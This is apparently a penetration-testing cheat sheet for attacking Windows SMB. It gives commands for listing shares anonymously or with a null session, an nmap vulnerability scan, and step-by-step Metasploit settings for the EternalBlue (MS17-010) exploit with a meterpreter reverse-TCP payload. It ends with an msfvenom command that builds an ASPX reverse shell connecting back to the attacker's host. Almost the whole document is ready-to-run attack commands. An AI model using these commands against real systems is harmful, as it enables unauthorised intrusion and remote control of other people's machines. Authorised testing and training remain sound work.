## Basic SMB Enumeration

```bash
smbclient -L //<ip>               # List available shares (anonymous)
smbclient //ip/share              # Connect to share (anonymous)
smbclient //ip/share -u <user>    # Connect as specific user

crackmapexec smb <ip> -u guest -p '' --shares  # List shares with null session
```

## Vulnerability Scanning
```bash
nmap -p 445 --script vuln -Pn -T4 -v <ip>   # Check for SMB vulns (e.g., MS17-010)
```


---

# EternalBlue (MS17-010)
### Exploit with Metasploit
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set LHOST <your_ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

### MSFVenom Payload 
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f aspx -o shell.aspx
```
